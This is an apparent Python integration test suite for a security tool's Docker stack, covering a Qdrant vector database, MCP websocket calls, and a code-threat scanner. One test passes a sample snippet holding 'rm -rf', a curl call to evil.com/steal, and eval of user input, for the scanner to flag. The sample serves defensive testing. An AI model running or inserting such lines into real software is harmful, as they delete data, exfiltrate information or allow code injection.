#!/usr/bin/env python3
"""
Full Stack Test for Claude Guardian Docker Deployment
Tests the integration of MCP service, vector database, and LightRAG
"""

import asyncio
import json
import logging
import requests
import websockets
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class FullStackTester:
    def __init__(self):
        self.qdrant_url = "http://localhost:6333"
        self.mcp_url = "ws://localhost:8083"
        
    async def test_vector_database(self):
        """Test vector database functionality"""
        logger.info("🗄️ Testing Vector Database (Qdrant)...")
        
        try:
            # Test basic connectivity
            response = requests.get(f"{self.qdrant_url}/collections")
            if response.status_code == 200:
                collections = response.json()['result']['collections']
                logger.info(f"✅ Connected to Qdrant - {len(collections)} collections available")
                
                for collection in collections:
                    name = collection['name']
                    info_response = requests.get(f"{self.qdrant_url}/collections/{name}")
                    if info_response.status_code == 200:
                        info = info_response.json()['result']
                        points_count = info.get('points_count', 0)
                        logger.info(f"   - {name}: {points_count} points")
                
                return True
            else:
                logger.error(f"❌ Failed to connect to Qdrant: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Vector database test failed: {e}")
            return False
    
    async def test_vector_search(self):
        """Test vector search functionality"""
        logger.info("🔍 Testing Vector Search...")
        
        try:
            # Create a simple search query
            search_vector = [0.1] * 384  # Simple test vector
            
            search_request = {
                "vector": search_vector,
                "limit": 3,
                "with_payload": True
            }
            
            response = requests.post(
                f"{self.qdrant_url}/collections/security_procedures/points/search",
                json=search_request,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                results = response.json()['result']
                logger.info(f"✅ Vector search successful - {len(results)} results")
                
                for result in results:
                    payload = result.get('payload', {})
                    score = result.get('score', 0.0)
                    title = payload.get('title', 'Unknown')
                    logger.info(f"   - {title} (Score: {score:.3f})")
                
                return len(results) > 0
            else:
                logger.error(f"❌ Vector search failed: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Vector search test failed: {e}")
            return False
    
    async def test_mcp_integration(self):
        """Test MCP service integration"""
        logger.info("🔌 Testing MCP Integration...")
        
        try:
            # First check if MCP service is available via HTTP health check
            try:
                health_response = requests.get("http://localhost:8083/health", timeout=5)
                if health_response.status_code == 200:
                    logger.info("✅ MCP HTTP health check passed")
                else:
                    logger.info("ℹ️  MCP HTTP health check not available (WebSocket only)")
            except:
                logger.info("ℹ️  MCP HTTP endpoint not available (WebSocket only mode)")
            
            # Test WebSocket connection
            async with websockets.connect(self.mcp_url) as websocket:
                # Initialize MCP session
                init_msg = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "initialize",
                    "params": {
                        "protocolVersion": "2024-11-05",
                        "clientInfo": {"name": "full-stack-tester", "version": "1.0.0"},
                        "capabilities": {}
                    }
                }
                
                await websocket.send(json.dumps(init_msg))
                response = await websocket.recv()
                init_result = json.loads(response)
                
                if 'result' in init_result:
                    server_name = init_result['result']['serverInfo']['name']
                    logger.info(f"✅ MCP connection established - Server: {server_name}")
                    
                    # Test tool listing
                    tools_msg = {
                        "jsonrpc": "2.0",
                        "id": 2,
                        "method": "tools/list",
                        "params": {}
                    }
                    
                    await websocket.send(json.dumps(tools_msg))
                    tools_response = await websocket.recv()
                    tools_result = json.loads(tools_response)
                    
                    if 'result' in tools_result:
                        tools = tools_result['result']['tools']
                        logger.info(f"✅ Found {len(tools)} security tools available")
                        return True
                    else:
                        logger.error("❌ Failed to list MCP tools")
                        return False
                else:
                    logger.error("❌ MCP initialization failed")
                    return False
            
        except Exception as e:
            logger.error(f"❌ MCP integration test failed: {e}")
            return False
    
    async def test_threat_analysis_pipeline(self):
        """Test complete threat analysis pipeline"""
        logger.info("🛡️ Testing Threat Analysis Pipeline...")
        
        try:
            async with websockets.connect(self.mcp_url) as websocket:
                # Initialize session
                init_msg = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "initialize",
                    "params": {
                        "protocolVersion": "2024-11-05",
                        "clientInfo": {"name": "threat-tester", "version": "1.0.0"},
                        "capabilities": {}
                    }
                }
                
                await websocket.send(json.dumps(init_msg))
                await websocket.recv()  # Consume init response
                
                # Test dangerous code analysis
                dangerous_code = '''
import os
import subprocess
# Potentially dangerous operations
os.system("rm -rf /tmp/test")
subprocess.call("curl http://evil.com/steal", shell=True)
eval(user_input)
'''
                
                scan_msg = {
                    "jsonrpc": "2.0",
                    "id": 2,
                    "method": "tools/call",
                    "params": {
                        "name": "security_scan_code",
                        "arguments": {
                            "code": dangerous_code,
                            "language": "python",
                            "security_level": "strict"
                        }
                    }
                }
                
                await websocket.send(json.dumps(scan_msg))
                scan_response = await websocket.recv()
                scan_result = json.loads(scan_response)
                
                if 'result' in scan_result:
                    content = scan_result['result']['content'][0]['text']
                    logger.info("✅ Threat analysis completed")
                    
                    # Check if threats were detected
                    if any(keyword in content.upper() for keyword in ['HIGH', 'CRITICAL', 'DANGEROUS', 'RISK']):
                        logger.info("✅ Security threats correctly identified")
                        logger.info(f"   Analysis: {content.split(chr(10))[1] if chr(10) in content else content[:100]}...")
                        return True
                    else:
                        logger.warning("⚠️  Threat analysis may need tuning")
                        return False
                else:
                    logger.error("❌ Threat analysis failed")
                    return False
                    
        except Exception as e:
            logger.error(f"❌ Threat analysis pipeline test failed: {e}")
            return False
    
    async def test_information_storage_retrieval(self):
        """Test information storage and retrieval"""
        logger.info("💾 Testing Information Storage & Retrieval...")
        
        try:
            # Store a new security procedure
            new_procedure = {
                "title": "Docker Security Best Practices",
                "description": "Security guidelines for Docker container deployments",
                "category": "container_security",
                "severity": "medium",
                "steps": "1. Use minimal base images 2. Run as non-root 3. Scan for vulnerabilities"
            }
            
            # Create embedding (mock)
            text_content = f"{new_procedure['title']} {new_procedure['description']}"
            embedding = [0.5] * 384  # Simple test embedding
            
            point = {
                "id": 12345,
                "vector": embedding,
                "payload": {
                    **new_procedure,
                    "created_at": datetime.now().isoformat(),
                    "type": "security_procedure"
                }
            }
            
            # Store in Qdrant
            store_response = requests.put(
                f"{self.qdrant_url}/collections/security_procedures/points",
                json={"points": [point]},
                headers={"Content-Type": "application/json"}
            )
            
            if store_response.status_code == 200:
                logger.info("✅ Information storage successful")
                
                # Test retrieval
                search_request = {
                    "vector": embedding,
                    "limit": 5,
                    "with_payload": True
                }
                
                search_response = requests.post(
                    f"{self.qdrant_url}/collections/security_procedures/points/search",
                    json=search_request,
                    headers={"Content-Type": "application/json"}
                )
                
                if search_response.status_code == 200:
                    results = search_response.json()['result']
                    if results and results[0]['id'] == 12345:
                        logger.info("✅ Information retrieval successful")
                        return True
                    else:
                        logger.warning("⚠️  Information retrieval may be inaccurate")
                        return False
                else:
                    logger.error("❌ Information retrieval failed")
                    return False
            else:
                logger.error("❌ Information storage failed")
                return False
                
        except Exception as e:
            logger.error(f"❌ Information storage/retrieval test failed: {e}")
            return False
    
    async def run_full_test_suite(self):
        """Run the complete test suite"""
        logger.info("🚀 Starting Claude Guardian Full Stack Test")
        logger.info("=" * 60)
        
        tests = [
            ("Vector Database", self.test_vector_database),
            ("Vector Search", self.test_vector_search),
            ("MCP Integration", self.test_mcp_integration),
            ("Threat Analysis Pipeline", self.test_threat_analysis_pipeline),
            ("Information Storage & Retrieval", self.test_information_storage_retrieval)
        ]
        
        results = {}
        
        for test_name, test_func in tests:
            logger.info(f"\n--- {test_name} Test ---")
            try:
                result = await test_func()
                results[test_name] = result
                status = "✅ PASSED" if result else "❌ FAILED"
                logger.info(f"{test_name}: {status}")
            except Exception as e:
                results[test_name] = False
                logger.error(f"{test_name}: ❌ FAILED with error: {e}")
        
        # Summary
        logger.info("\n" + "=" * 60)
        logger.info("🎯 Test Results Summary")
        logger.info("=" * 60)
        
        passed = sum(1 for result in results.values() if result)
        total = len(results)
        
        for test_name, result in results.items():
            status = "✅ PASSED" if result else "❌ FAILED"
            logger.info(f"{test_name:.<30} {status}")
        
        logger.info("-" * 60)
        logger.info(f"Overall Results: {passed}/{total} tests passed")
        
        if passed == total:
            logger.info("🎉 ALL TESTS PASSED - Claude Guardian is fully operational!")
        elif passed >= total * 0.8:
            logger.info("✅ MOSTLY WORKING - Minor issues detected")
        else:
            logger.info("⚠️  NEEDS ATTENTION - Multiple failures detected")
        
        return passed / total


async def main():
    """Main test execution"""
    tester = FullStackTester()
    success_rate = await tester.run_full_test_suite()
    
    print(f"\n🏁 Test Suite Completed - Success Rate: {success_rate*100:.0f}%")
    return success_rate >= 0.8


if __name__ == "__main__":
    success = asyncio.run(main())
    exit(0 if success else 1)